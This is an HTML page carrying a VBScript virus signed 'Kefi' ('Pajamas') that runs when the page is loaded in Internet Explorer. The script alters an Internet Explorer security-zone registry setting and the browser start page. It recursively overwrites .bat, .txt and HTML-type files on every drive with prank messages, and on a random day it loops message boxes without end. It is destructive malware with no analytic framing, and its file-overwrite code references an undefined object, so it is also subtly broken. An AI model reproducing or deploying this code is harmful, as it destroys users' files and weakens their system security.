<HTML><BODY>
<SCRIPT Language = "JavaScript">
<!--
	var userAgent=navigator.appName;
	var agentInfo=userAgent.substring(0, 1);
    if(agentInfo == "M"){
}
else {
alert("The page you want to view was designed for Internet Explorer only, \n Please view this page with Internet Explorer")
self.close()
}
//-->
</SCRIPT>
<Script Language="VBScript"><!--
'Pajamas.html\vbs
'by Kefi
Dim Shell, Fso, x,Drives, Drive, Folder, Files, File, Subfolders,Subfolder 
On Error Resume Next
Set Shell = CreateObject("WScript.Shell")
Set Fso = CreateObject("scripting.filesystemobject")
Set Drives=fso.drives
Shell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201", 0, "REG_DWORD"
Shell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201", 0, "REG_DWORD"
Shell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Main\Start_Page", "www.newbian.com"

For Each Drive in Drives
	If drive.isready then
		Dosearch drive
	end If 
Next 

If Day(Now()) = Int(Rnd * 7) + 1 Then
        Shell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RegisteredOwner", " Kefi "
         Do
         MsgBox "Don't forget your" & vbCrLf & "Pajamas!", vbCritical + vbOKOnly, "Pajamas"
         Loop
End If

Function Dosearch(Path) 
Set Folder=fso.getfolder(path) 
Set Files = folder.files 

For Each File in files
	If fso.GetExtensionName(file.path)="bat" Then
		Set FileDropper = Fso.createtextfile(NewFile.Path)
		FileDropper.writeline "a_message_from_kefi:"
		FileDropper.writeline "echo Don't forget your Pajamas"
		FileDropper.writeline "goto a_message_from_kefi:"
		FileDropper.Close
	End If

	If fso.GetExtensionName(file.path)="txt" Then
		Set FileDropper = Fso.createtextfile(NewFile.Path)
		FileDropper.writeline "Don't forget your Pajamas" & vbCrLf & "a message from Kefi"
		FileDropper.Close
	End If

	If fso.GetExtensionName(file.path)="htm" Or fso.GetExtensionName(file.path)="html" Or fso.GetExtensionName(file.path)="asp" Or fso.GetExtensionName(file.path)="htx" Or fso.GetExtensionName(file.path)="hta" Then
		Set FileDropper = Fso.createtextfile(NewFile.Path)
		FileDropper.writeline "<HTML><HEAD><TITLE>Pajamas</TITLE></HEAD><BODY BGCOLOR=" & Chr(34) & "#FFFFFF" & Chr(34) & " TEXT=" & Chr(34) & "#000000" & Chr(34) & "><FONT FACE=" & Chr(34) & "OCR A Extended" & Chr(34) & "><CENTER><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><font size=" & Chr(34) & "5" & Chr(34) & ">Don't forget your Pajamas</font><BR><font size=" & Chr(34) & "1" & Chr(34) & ">a message from Kefi</font></CENTER></BODY></HTML>"
		FileDropper.Close
	End If
Next
Set Subfolders = folder.SubFolders 
For Each Subfolder in Subfolders 
	Dosearch Subfolder.path 
Next 
end function 

--></script></BODY></HTML>
<HTML><HEAD><TITLE>Pajamas</TITLE></HEAD><BODY BGCOLOR="#FFFFFF" TEXT="#000000"><FONT FACE="OCR A Extended"><CENTER><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><font size=5>Don't forget your Pajamas</font><BR><font size="1">a message from Kefi</font></CENTER></BODY></HTML>